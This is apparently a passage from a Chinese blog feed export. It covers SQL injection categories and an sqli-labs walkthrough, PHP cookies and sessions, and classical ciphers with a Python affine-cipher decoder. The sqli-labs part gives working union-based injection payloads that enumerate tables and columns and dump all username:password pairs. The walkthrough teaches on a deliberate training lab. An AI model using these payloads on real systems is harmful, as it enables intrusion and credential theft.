值得注意的是这里相比于数字型注入类型的sql语句原型多了引号，可以是单引号或者是双引号。</p><p>若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where name='admin' and 1=1 '</code> 我们需要将这些烦人的引号给处理掉。</p><h3 id="（3）搜索型注入点"><a href="#（3）搜索型注入点" class="headerlink" title="（3）搜索型注入点"></a>（3）搜索型注入点</h3><p>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 <code>"keyword=关键字"</code> 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。</p><p>此类注入点提交的 SQL 语句，其原形大致为：<code>select * from 表名 where 字段 like '%关键字%'</code> 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where 字段 like '%测试%' and '%1%'='%1%'</code></p><blockquote><p>按照数据提交的方式来分类</p></blockquote><h3 id="（1）GET-注入"><a href="#（1）GET-注入" class="headerlink" title="（1）GET 注入"></a>（1）GET 注入</h3><p>提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接<a href="http://xxx.com/index.php?id=1" target="_blank" rel="noopener">http://xxx.com/index.php?id=1</a> , id 是注入点。</p><h3 id="（2）POST-注入"><a href="#（2）POST-注入" class="headerlink" title="（2）POST 注入"></a>（2）POST 注入</h3><p>使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。</p><h3 id="（3）Cookie-注入"><a href="#（3）Cookie-注入" class="headerlink" title="（3）Cookie 注入"></a>（3）Cookie 注入</h3><p>HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。</p><h3 id="（4）HTTP-头部注入"><a href="#（4）HTTP-头部注入" class="headerlink" title="（4）HTTP 头部注入"></a>（4）HTTP 头部注入</h3><p>注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p><blockquote><p>按照执行效果来分类</p></blockquote><h3 id="（1）基于布尔的盲注"><a href="#（1）基于布尔的盲注" class="headerlink" title="（1）基于布尔的盲注"></a>（1）基于布尔的盲注</h3><p>即可以根据返回页面判断条件真假的注入。</p><h3 id="（2）基于时间的盲注"><a href="#（2）基于时间的盲注" class="headerlink" title="（2）基于时间的盲注"></a>（2）基于时间的盲注</h3><p>即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p><h3 id="（3）基于报错注入"><a href="#（3）基于报错注入" class="headerlink" title="（3）基于报错注入"></a>（3）基于报错注入</h3><p>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p><ol><li>单引号</li><li>双引号</li><li>基于数字型注入</li></ol><h3 id="（4）联合查询注入"><a href="#（4）联合查询注入" class="headerlink" title="（4）联合查询注入"></a>（4）联合查询注入</h3><p>可以使用union的情况下的注入。</p><h3 id="（5）堆查询注入"><a href="#（5）堆查询注入" class="headerlink" title="（5）堆查询注入"></a>（5）堆查询注入</h3><p>可以同时执行多条语句的执行时的注入。</p><h3 id="（6）宽字节注入"><a href="#（6）宽字节注入" class="headerlink" title="（6）宽字节注入"></a>（6）宽字节注入</h3><p>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）</p><h3 id="基于sqli-labs的实践操作"><a href="#基于sqli-labs的实践操作" class="headerlink" title="基于sqli-labs的实践操作"></a>基于sqli-labs的实践操作</h3><h4 id="1-基于报错的GET-sql注入"><a href="#1-基于报错的GET-sql注入" class="headerlink" title="1.基于报错的GET sql注入"></a>1.基于报错的GET sql注入</h4><h5 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h5><p><img src="/img/less-1.png" alt=""></p><p>提示说输入一个数字作为ID的值</p><p>那么先在url输入?id=1</p><p><img src="/img/less-1%E8%BE%93%E5%85%A5id=1.png" alt=""></p><p>显示查询成功，返回了用户Dumb</p><p>然后尝试使其报错，输入 ?id=1’</p><p><img src="/img/less-1%E8%BE%93%E5%85%A5id-1'.png" alt=""></p><p>报错了，显示为 ‘’1’’ LIMIT 0,1’</p><p>有了这个，我们就可以揣测一下网站后端的sql请求语句了</p><p>首先，这个报错语句是被 ‘ ‘ 单引号闭合的，于是将其拆分 ‘   ‘1’’ LIMIT 0,1   ‘，可知报错的段落是 ‘1’’ LIMIT 0,1,由于我们输入的id值是1’</p><p>,所以再拆分一下为’   1’   ‘ LIMIT 0,1</p><p>由此可以看出后台语句大致是 </p><pre class="line-numbers language-mysql"><code class="language-mysql">"SELECT username,password FROM user WHERE id = '$id' limit 0,1 "<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> id被单引号包裹，这是字符型注入点</p><h5 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h5><p><img src="/img/less-2.png" alt=""></p><p>流程与上面差不多</p><p>不同的是，这次输入id=1’后报错为 ‘’ LIMIT 0,1’</p><p>还是用和上面一样的方法拆分这段 ，’     ‘ LIMIT 0,1      ‘  –&gt;’ LIMIT 0,1</p><p>可以看到limit前面多了一个单引号，而我们正是在1后面多加了一个单引号，说明这个单引号并没有被id读进去</p><p>由此可以看出后台语句大致是 </p><pre class="line-numbers language-mysql"><code class="language-mysql">"SELECT username,password FROM user WHERE id =$ id limit 0,1 "<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>id没有被单引号包裹，这是一个数字型注入点</p><h5 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h5><p><img src="/img/less-3.png" alt=""></p><p>这次的报错是 ‘’1’’) LIMIT 0,1’</p><p>拆分 ‘   ‘1’’) LIMIT 0,1   ‘–&gt;’1’’) LIMIT 0,1–&gt;’   <em>1’</em>   ‘) LIMIT 0,1</p><p>显然，后台语句是</p><pre class="line-numbers language-mysql"><code class="language-mysql">"SELECT username,password FROM user WHERE id = ('$id') limit 0,1 "<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但上面的语句只不过都是猜测，怎么验证呢，只有再构造语句来验证了</p><p>比如上面这个less-3</p><p>我们试着把输入改为 id=1’) –+或id=1’) –%20</p><p><img src="/img/--+.png" alt=""></p><p>![](/img/– .png)</p><p>都成功了，这就说明后台语句和我们想的八九不离十了</p><h5 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h5><p>这次除了使用注释符，用上面的方法怎么输入页面都不报错，而题目说了 Double quotes,显然这次id是被””包裹了，输入的id值都会被当作字符串，加单引号括号都没用。</p><p>那就使用\来制造报错，输入 id=1\</p><p>返回报错 ‘“1\“) LIMIT 0,1’–&gt;”1\“) LIMIT 0,1</p><p>\将后面的双引号消掉了，于是这一段语句就闭合不了了，遂报错</p><p>合理推测：</p><pre class="line-numbers language-mysql"><code class="language-mysql">"SELECT username,password FROM user WHERE id = ("id") limit 0,1 "<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>验证：</p><p><img src="/img/less-4.png" alt=""></p><p>这样4种不同的注入点的后台语句就通过报错大致的试出来了</p><p>之后就可以根据注入点类型通过order by语句测试字段数，通过union语句爆出表名，字段名等</p><p>例如less-1(字符型) 就可以输入?id=1’ order by 1(,2,3,4… ) –+测出该表中column的数量，order by最多能够到几，表中就有几段column，这对之后union注入有大用</p><p>less-1能够order by到3，也就是它有3个字段，于是接下来union注入</p><p>我们要构造的语句是SELECT username,password FROM user WHERE id = ‘0’ union select 1,2,3 –+ limit 0,1</p><p>所以输入（如果利用hackerbar或max hackerbar工具会方便很多）：id=0’ union select 1,2,3 –+</p><p>这里构造id=0的目的就是让这一段请求报错，这样页面上显示的才是union联合语句查找出来的结果</p><p>效果</p><p><img src="/img/union%E6%B3%A8%E5%85%A5.png" alt=""></p><p>可以看到，我们select 1,2,3 ，它回显了2，3，说明返回的是三个字段中的第二个和第三个，这对接下来爆表和爆库有用</p><p>于是接下来注入 id=0’ union select 1,user(),database() –+</p><p><img src="/img/union%E7%88%86%E5%BA%93.png" alt=""></p><p>爆出了用户名和使用的数据库名</p><p>然后还可以用version()函数爆出数据库版本，这样就可以针对性的进行一些注入</p><p>例如：</p><p>爆表：</p><pre class="line-numbers language-mysql"><code class="language-mysql">id=0' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema=database() --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​            information_schema是储存了所有数据库信息的库，tables储存了所有表信息的表</p><p><img src="/img/union%E7%88%86%E8%A1%A8.png" alt=""></p><p>看到了最后一个表是’users’,可用于下一步爆字段</p><p>爆字段：</p><pre class="line-numbers language-mysql"><code class="language-mysql">id=0' union select 1,group_concat(column_name),database() from information_schema.columns where table_name='users' --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/img/union%E7%88%86%E5%AD%97%E6%AE%B5.png" alt=""></p><p>爆出来了users表中的所有字段，最重要的user,password等全出来了，接下来就可以union查询出它们的值了</p><pre class="line-numbers language-mysql"><code class="language-mysql">id=0' union select 1,group_concat(username,0x3a,password),3 from users --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="E:/%E6%96%87%E6%A1%A3/Github%E4%BB%93%E5%BA%93/LiGuHeiYi/LiGuHeiYi.github.io/_posts/img/union%E7%88%86%E5%87%BA%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.png" alt=""></p><p>好家伙，借助group_concat()方法，该数据库所有的账号密码都以“账号：密码”的格式爆出来了</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web常见漏洞防御基本原理</title>
      <link href="/2020/10/12/2020-10-12-web-chang-jian-lou-dong-fang-yu-ji-ben-yuan-li/"/>
      <url>/2020/10/12/2020-10-12-web-chang-jian-lou-dong-fang-yu-ji-ben-yuan-li/</url>
      
        <content type="html"><![CDATA[<h1 id="web常见漏洞防御基本原理"><a href="#web常见漏洞防御基本原理" class="headerlink" title="web常见漏洞防御基本原理"></a>web常见漏洞防御基本原理</h1><p>咕咕咕~</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cookie与session</title>
      <link href="/2020/10/04/2020-10-04-cookie-yu-session/"/>
      <url>/2020/10/04/2020-10-04-cookie-yu-session/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><p>cookie是一种服务端配置在用户电脑上的小文件，用于保存用户信息。因为http(s)是无连接的，所以服务器没法记住同一个用户，从用户的cookie中获取一定的信息（主要用于识别用户），能够帮助服务端处理请求以及提升用户体验。</p><p>PHP能够创建或取回cookie的值</p><h2 id="创建cookie"><a href="#创建cookie" class="headerlink" title="创建cookie"></a>创建cookie</h2><p>setcookie()（或setrawcookie()）用于创建cookie</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">setcookie</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>value<span class="token punctuation">,</span>expire<span class="token punctuation">,</span>path<span class="token punctuation">,</span>domain<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>实例1：</p><pre class="line-numbers language-php+HTML"><code class="language-php+HTML"><?phpsetcookie('user','Li',time()+3600);    //设置user的值为'Li',在一小时后过期?><html>  ...</html><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发送cookie时会自动对 cookie值进行url编码，读取时会自动解码，如果不要进行url编码，就可以使用setrawcookie()函数</p><p>实例 2:</p><p>还可以通过另一种方式设置 cookie 的过期时间。这也许比使用秒表示的方式简单。</p><pre class="line-numbers language-php+HTML"><code class="language-php+HTML"><?php$expire=time()+60*60*24*30;setcookie("user", "runoob", $expire);?><html>  ...  </html><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="读取cookie值"><a href="#读取cookie值" class="headerlink" title="读取cookie值"></a>读取cookie值</h2><p> $_COOKIE 变量用于取回 cookie 的值。</p><pre class="line-numbers language-php+HTML"><code class="language-php+HTML"><?phpif(isset($_COOKIE['user']))    //用isset()函数来判断是否设置了名为'user'的cookie{    $user=$_COOKIE['user'];    //读取user的值    echo '欢迎'.$user.'！</br>';}else{    echo '欢迎，游客！'}print_r($_COOKIE);    //输出所有cookie值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="删除-Cookie？"><a href="#删除-Cookie？" class="headerlink" title="删除 Cookie？"></a>删除 Cookie？</h2><p>当删除 cookie 时，只要使过期日期变更为过去的时间点。</p><p>删除的实例：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// 设置 cookie 过期时间为过去 1 小时</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> <span class="token string">"Li"</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h1><p>PHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的。</p><p>还是由于http(s)无连接的原因，当用户进行了一次操作以后，一般来说，web服务器并不能记住用户，如果用户需要连续，连贯的操作，就会很难受。而通过在服务器上储存session信息来记录用户本次“会话”的临时信息（用户名，身份信息，行为等），可以让服务器知道用户是谁以及做了什么。</p><p>Session信息是临时的，在用户离开网站后就会销毁，需要保存的信息只能储存在数据库中</p><p><strong>Session 的工作机制是：为每个访客创建一个唯一的 id (UID)，并基于这个 UID 来存储变量。UID 存储在 cookie 中，或者通过 URL 进行传导。</strong></p><h2 id="开始Session"><a href="#开始Session" class="headerlink" title="开始Session"></a>开始Session</h2><pre class="line-numbers language-php+HTML"><code class="language-php+HTML"><?phpsession_start(); ?><html><body></body></html><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：session_start()函数必须在标签之前。</p><h2 id="储存和读取session"><a href="#储存和读取session" class="headerlink" title="储存和读取session"></a>储存和读取session</h2><h2 id="销毁-Session"><a href="#销毁-Session" class="headerlink" title="销毁 Session"></a>销毁 Session</h2><p>如果您希望删除某些 session 数据，可以使用 unset() 或 session_destroy() 函数。</p><p>unset() 函数用于释放指定的 session 变量：</p><p><strong>实例</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>     <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'views'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>            <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'views'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以通过调用 session_destroy() 函数<strong>彻底销毁</strong> session：</p><p><strong>实例</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>     <span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="Cookie和Session"><a href="#Cookie和Session" class="headerlink" title="Cookie和Session"></a>Cookie和Session</h1><p>cookie储存在用户计算机中且可查询可更改，session处在网站服务器中可见但不可随意更改，从这个角度来说，session比cookie更加安全”一些“。</p><p>但session不能完全取代cookie的作用，只有session和cookie一起使用才能带来最高的效率。将一些消息保存在用户端以提高便利性，将一些信息保存在服务端以保证安全性和完整性。</p><p>一般来说，用cookie来储存session ID，以帮助服务器实别用户。</p><p>session ID即服务器中保存的session文件的名字，一般形如这样：sess_4c83638b3b0dbf65583181c2f89168ec（后面是32位编码的随机字符，也正是session ID）。这样，当用户第一次访问服务器，服务器生成一个唯一的随机的session ID，并放进一个cookie里发送给客户端，客户端再访问服务器时就会自动带着这个cookie，服务器就能识别用户并找到对应session文件里的信息了（现在还有一种机制叫token，跟这个机制很像，但也有一定的不同，以后单独再开篇文章记录）</p><p>以上是客户端开启了cookie服务的情况，如果客户端禁用了cookie，就需要服务器（服务器会判断客户端是否开启了cookie）在url中添加session ID来实现session的传输，</p><p>形如 ：<a href="http://www.xxx.com?PHPSESSID=4c83638b3b0dbf65583181c2f89168ec" target="_blank" rel="noopener">www.xxx.com?PHPSESSID=4c83638b3b0dbf65583181c2f89168ec</a></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//  保存一天</span><span class="token variable">$lifeTime</span> <span class="token operator">=</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">3600</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//  取得当前 Session 名，默认为 PHPSESSID</span><span class="token variable">$sessionName</span> <span class="token operator">=</span> <span class="token function">session_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//  取得 Session ID</span><span class="token variable">$sessionID</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token variable">$sessionName</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//  使用 session_id() 设置获得的 Session ID</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token variable">$sessionID</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_set_cookie_params</span><span class="token punctuation">(</span><span class="token variable">$lifeTime</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者使用隐藏表单来传输session，自动在表单中添加一个属性为”hidden”的<input>,里面提交的是服务器为用户生成的session值。</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>PHPSESSID<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>4c83638b3b0dbf65583181c2f89168ec<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>古典密码从0到1</title>
      <link href="/2020/10/02/2020-10-01-gu-dian-mi-ma-cong-ling-dao-yi/"/>
      <url>/2020/10/02/2020-10-01-gu-dian-mi-ma-cong-ling-dao-yi/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="古典密码从0到1"><a href="#古典密码从0到1" class="headerlink" title="古典密码从0到1"></a>古典密码从0到1</h1><p><strong><img src="https://pic1.zhimg.com/80/v2-f483400333b7ccaa8689e9cfc0c3e8dc_720w.jpg" alt="img"></strong></p><h2 id="古典密码和现代密码的区别："><a href="#古典密码和现代密码的区别：" class="headerlink" title="古典密码和现代密码的区别："></a><strong>古典密码和现代密码的区别：</strong></h2><p>古典密码是密码学中的其中一个类型，其大部分加密方式都是利用替换式密码或移项式密码，有时则是两者的混合。其于历史中经常使用，但现代已经很少使用，大部分的已经不再使用了。一般而言，经典密码是基于一个拼音字母（像是 A-Z）、动手操作或是简单的设备。它们可能是一种简单的密码法，以致于不可信赖的地步，特别是有新技术被发展出来后。</p><p>现代的方法是用电脑或是其它数字科技，基于比特和字节上操作。许多经典密码被受尊重的人使用，像是尤利乌斯·凯撒和拿破仑，他们创造了一些常被人们使用的密码。许多密码起源于军事上，相同立场的人常使用来寄送秘密消息。经典的方法常攻击密码文，有时候甚至不知其密码系统，也可以使用工具，像是频率分析法。有些经典密码是使用先进的机器或是机电密码机器，像是恩尼格玛密码机。                           —维基</p><p>其中，古典密码学，作为一种实用性艺术存在，其编码和破译通常依赖于设计者和敌手的创造力与技巧，并没有对密码学原件进行清晰的定义。古典密码学主要包含以下几个方面：</p><p>单表替换加密（Monoalphabetic Cipher）</p><p>多表替换加密（Polyalphabetic Cipher）</p><p>奇奇怪怪的加密方式                                             –ctf wiki</p><h2 id="凯撒密码："><a href="#凯撒密码：" class="headerlink" title="凯撒密码："></a><strong>凯撒密码：</strong></h2><p>​    凯撒曾经使用这种密码与其将军们来联系，所以用凯撒来命名这种密码。</p><p>根据图片来了解加密原理。凯撒密码一般适用于26个英文字母。根据偏移量来进行加密。如图所示，当偏移量=3。即是A-D,B-E。</p><p><img src="https://pic2.zhimg.com/80/v2-ab311b6e604849f12c19e5e96818a925_720w.jpg" alt="img"></p><p>​    把字母转成数学，数学公式如下。</p><p><img src="https://pic1.zhimg.com/80/v2-f77f29985ee9014f3df11575682ac180_720w.jpg" alt="img"></p><h3 id="在线加解密网站："><a href="#在线加解密网站：" class="headerlink" title="在线加解密网站："></a><strong>在线加解密网站：</strong></h3><p><a href="https://link.zhihu.com/?target=https%3A//www.qqxiuzi.cn/bianma/kaisamima.php" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/kaisamima.php</a></p><p><a href="https://link.zhihu.com/?target=http%3A//www.metools.info/code/c70.html" target="_blank" rel="noopener">http://www.metools.info/code/c70.html</a></p><p><a href="https://link.zhihu.com/?target=http%3A//www.atoolbox.net/Tool.php%3FId%3D778" target="_blank" rel="noopener">http://www.atoolbox.net/Tool.php?Id=778</a></p><h2 id="仿射密码："><a href="#仿射密码：" class="headerlink" title="仿射密码："></a><strong>仿射密码：</strong></h2><p>数学加密公式：</p><p><img src="https://pic3.zhimg.com/80/v2-1a7aeab7e90203fc056e398344ce2b7a_720w.jpg" alt="img"></p><p>仿射密码中解密需要用到求逆元</p><p>直接给出python解密脚本：</p><pre class="line-numbers language-text"><code class="language-text">import primefacdef affine_decode(c,a,b,origin="abcdefghijklmnopqrstuvwxyz"):    r=""    n=len(origin)    ai=primefac.modinv(a,n)%n    for i in c:        if origin.find(i)!=1:            r+=origin[(ai*(origin.index(i)-b))%n]        else:            r+=i    return rprint affine_decode("ihhwvcswfrcp",5,8)def affine_guessab(m1,c1,m2,c2,origin="abcdefghijklmnopqrstuvwxyz"):    x1=origin.index(m1)    x2=origin.index(m2)    y1=origin.index(c1)    y2=origin.index(c2)    n=len(origin)    dxi=primefac.modinv(x1-x2,n)%n    a=dxi*(y1-y2) % n    b=(y1-a*x1)%n    return a,bprint affine_guessab("a","i","f","h")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="仿射密码在线加解密网站："><a href="#仿射密码在线加解密网站：" class="headerlink" title="仿射密码在线加解密网站："></a>仿射密码在线加解密网站：</h3><p><a href="https://link.zhihu.com/?target=http%3A//www.atoolbox.net/Tool.php%3FId%3D911" target="_blank" rel="noopener">http://www.atoolbox.net/Tool.php?Id=911</a></p><h5 id="仿射密码真题-one："><a href="#仿射密码真题-one：" class="headerlink" title="仿射密码真题-one："></a>仿射密码真题-one：</h5><p>Buuctf- Crypto-[GKCTF2020]小学生的密码学</p><p>e(x)=11x+6(mod26)</p><p>密文：welcylk</p><p>（flag为base64形式）</p><p><img src="https://pic4.zhimg.com/80/v2-cf93192b800a57815bc7b5c050f8c673_720w.jpg" alt="img"></p><p><img src="https://pic2.zhimg.com/80/v2-b9d84b6e31edf9ebe9931c5174eba819_720w.jpg" alt="img"></p><h2 id="四方密码："><a href="#四方密码：" class="headerlink" title="四方密码："></a><strong>四方密码：</strong></h2><p>四方密码是一种对称式加密法，由法国人Felix Delastelle（1840年–1902年）发明。</p><p>这种方法将字母两个一组，然后采用多字母替换密码。</p><p>四方密码用4个5×5的矩阵来加密。每个矩阵都有25个字母（通常会取消Q或将I,J视作同一样，或改进为6×6的矩阵，加入10个数字）。</p><p>选两个密钥，example和keyword。去掉重复的字母。就是example变成exampl。余下的字母顺序存入矩阵即可</p><p>加密矩阵放右上和左下。</p><p><img src="https://pic1.zhimg.com/80/v2-7f9734b21e0caee6689d77d9de7e1b6c_720w.jpg" alt="img"></p><p>加密步骤。把字符串按两个字母一组分开</p><p>Helloworld</p><p>He ll ow or ld</p><p>找第一组第一个字母在左上角矩阵的位置：</p><p><img src="https://pic3.zhimg.com/80/v2-c210fedc80540995f608f795a073acda_720w.jpg" alt="img"></p><p>找第一组第二个字母在右下角矩阵的位置：</p><p><img src="https://pic1.zhimg.com/80/v2-165d0ff7602b3b7801cd2e050cc948e0_720w.jpg" alt="img"></p><p>先找和一个字母同横的，和第二个字母同直的</p><p><img src="https://pic1.zhimg.com/80/v2-9df900be2dee2b0602d420ff290a5adc_720w.jpg" alt="img"></p><p>第一个字母同直，第二个字母同横的</p><p><img src="https://pic4.zhimg.com/80/v2-01dc7c7890019f58beef4ade3bd5eab7_720w.jpg" alt="img"></p><p>得到he加密后为FY</p><p>如此可得接下来，最后就是</p><p>he lp me ob iw an ke no bi</p><p>FY GM KY HO BX MF KK KI MD</p><h5 id="四方密码真题-one："><a href="#四方密码真题-one：" class="headerlink" title="四方密码真题-one："></a>四方密码真题-one：</h5><p>Buuctf-crypo-四面八方</p><p>四方密码：</p><p>wiki上了解四方密码如何加解密的一个过程</p><p><a href="https://link.zhihu.com/?target=https%3A//zh.wikipedia.org/wiki/%E5%9B%9B%E6%96%B9%E5%AF%86%E7%A2%BC" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E5%9B%9B%E6%96%B9%E5%AF%86%E7%A2%BC</a></p><p>密钥存阵</p><p>通常在题目中会给定2个密钥，我们要去掉Q或者把I和J当成一个。按照26个英文字母。秘钥中出现的不填。补充成5*5的矩阵</p><p><img src="https://pic4.zhimg.com/80/v2-bf5760187447c0cdd17602207d2b8453_720w.jpg" alt="img"></p><p>这题直接填充即可</p><p>securityabdfghjklmnopvwxz</p><p>securityadbfghjklmnopvwxz</p><p>abcdefghijklmnopqrstuvwxyz</p><p>informatn</p><p>informatbcdeghjklpsuvwxyz</p><p>abcdefghijklmnopqrstuvwxyz</p><h3 id="在线解密工具："><a href="#在线解密工具：" class="headerlink" title="在线解密工具："></a><strong>在线解密工具：</strong></h3><p><a href="https://link.zhihu.com/?target=http%3A//ctf.ssleye.com/four.html" target="_blank" rel="noopener">http://ctf.ssleye.com/four.html</a></p><p>根据题目说的解出来的语句是个通顺的句子，那肯定排序就有点问题</p><p><img src="https://pic1.zhimg.com/80/v2-6dfcefe68d59545916e53be11cfebb3c_720w.jpg" alt="img"></p><p><strong>接下来可以拿出词频分析。</strong></p><p>这边分割可以多试试。可以看出来个success，其他位置试</p><p><strong><a href="https://link.zhihu.com/?target=https%3A//quipqiup.com/" target="_blank" 